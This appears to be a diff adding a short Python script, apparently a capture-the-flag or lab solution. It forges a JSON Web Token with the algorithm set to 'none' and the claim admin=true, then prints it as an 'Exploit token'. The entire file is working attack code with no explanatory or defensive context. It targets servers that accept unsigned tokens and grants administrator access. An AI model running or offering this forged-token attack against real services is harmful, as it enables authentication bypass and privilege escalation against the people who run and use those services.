@@ -1,0 +1,18 @@
+import base64
+import json
+
+# Step 1: Define the JWT header and payload
+header = {"typ": "JWT", "alg": "none"}
+payload = {"admin": True}
+
+# Step 2: Base64 URL encode the header and payload without padding
+def b64url_encode(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
+
+header_b64 = b64url_encode(header)
+payload_b64 = b64url_encode(payload)
+
+# Step 3: Construct the token without a signature
+token = f"{header_b64}.{payload_b64}."
+
+print("Exploit token:", token)
